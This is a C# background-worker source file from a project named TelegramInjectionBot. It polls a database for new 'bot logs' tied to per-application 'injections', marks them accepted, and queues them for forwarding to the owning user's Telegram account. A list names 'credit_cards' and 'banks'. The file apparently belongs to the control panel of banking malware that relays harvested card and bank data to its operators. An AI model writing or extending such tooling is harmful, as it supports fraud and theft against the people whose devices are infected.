using Microsoft.EntityFrameworkCore;
using TelegramInjectionBot.Data;
using TelegramInjectionBot.Stores;

namespace TelegramInjectionBot.Workers;

public class CheckNewBotLogsWorker : BackgroundService
{
    private readonly BotLogStore _botLogStore;
    private readonly EFContext _context;
    private readonly ILogger<InjectionToTelegramWorker> _logger;

    public CheckNewBotLogsWorker(ILogger<InjectionToTelegramWorker> logger, IServiceProvider provider,
        BotLogStore botLogStore)
    {
        _context = provider.CreateScope().ServiceProvider.GetRequiredService<EFContext>();
        _logger = logger;
        _botLogStore = botLogStore;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        while (!stoppingToken.IsCancellationRequested)
        {
            await Iteration();

            await Task.Delay(1000, stoppingToken);
        }
    }

    private async Task Iteration()
    {
        List<string> allowedTypes = new() { "credit_cards", "banks" };

        var botLogs = await _context.BotLogs
            .Include(log => log.Bot)
            .ThenInclude(bot => bot.UserTelegramInjections)
            .ThenInclude(inj => inj.User)
            .Where(log =>
                log.Bot.UserTelegramInjections.Any(inj =>
                    inj.User.TelegramId != null && inj.Application == log.Application) && !log.TelegramAccepted)
            .ToListAsync();

        foreach (var botLog in botLogs)
        {
            botLog.TelegramAccepted = true;
            await _context.SaveChangesAsync();
            _context.Entry(botLog).State = EntityState.Detached;

            _botLogStore.BotLogs.Enqueue(new UserBotLog
            {
                Log = botLog,
                TelegramId = botLog.Bot.UserTelegramInjections.First().User.TelegramId
            });

            _logger.LogInformation($"{botLog.Id} accepted on telegram");
        }
    }
}